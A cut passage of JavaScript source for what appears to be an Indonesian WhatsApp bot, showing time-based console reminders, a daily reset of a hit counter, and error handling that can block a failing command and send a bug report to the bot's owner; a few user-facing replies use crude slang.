          console.log(color(`[${fake}]`, 'gold'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'cyan'))
          }
          if (timeWib >= '18:00' && timeWib <= '18:10') {
        	console.log(color(`[${fake}]`, 'gold'), color('Udah mahgrip nih kak, jangan lupa sholat ya', 'cyan'))
          }
          if (timeWib >= '19:00' && timeWib <= '19:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Bentar lagi jam 8 kak, Yok kak main botnya buat nanti lagi', 'cyan'))
           }
          if (timeWib >= '20:00' && timeWib <= '20:10') {
           console.log(color(`[${fake}]`, 'gold'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'cyan'))
           }
          if (timeWib >= '00:00' && timeWib <= '00:10') {
           console.log(color(`[${fake}]`, 'gold'), color(`${fake} ngantuk kak, tidur dulu ya kak`, 'cyan'))
           }
           
	       if (timeWib >= '08:00' && timeWib <= '08:01' ){
	       var obj = [] 
           fs.writeFileSync('./database/hitToday.json', JSON.stringify(obj))         
	       console.log(color(`[Hit Today]`, 'red'), color('Hit Today telah di reset', 'cyan'))
	      } 
                

		
    } catch (e) {
    e = String(e)  
    if (!e.includes("this.isZero")) {
    console.log(color('[SYSTEM] : %s', 'white'), color(e, 'green'))   
    if(e.includes("BaileysError: Not expecting a response")) return setReply(`⸢ *SYSTEM-ERROR* ⸥\n\n${e}\n*NOTE :*\nPesan sementara grup masih aktif goblok\n\n© ${fake1}`)
    if(autoblockcmd){        
    addblockcmd(command,listcmdblock) 
    await setReply("Command telah di block karena terjadi error")
    }
    if(autoReport){
    await xdev.sendMessage(`${Ownerin}`,`⸢ *Laporan Bug* ⸥\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nInfo laporan : \n\n${e}\n\nCommand :\n${prefix}${command}\n\nQuery :\n${q}\n\n\n© ${fake1}\n${calender}\n`,text)    
    await xdev.modifyChat(`${Ownerin}`, ChatModification.delete)
    if(autoblockcmd) return
    setTimeout( () => {
	 xdev.sendMessage(from,"Ketik yang bener tod / sedang update or Error...",text)
	},2000)
	}
    }
    } 

    


                    
      









    
    
    

    
    
                    
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
    if (!e.includes("jid is not defined")) {
    console.log(color('Message : %s', 'white'), color(e, 'green'))
        }
	// console.log(e)
	}
}
}




	
    
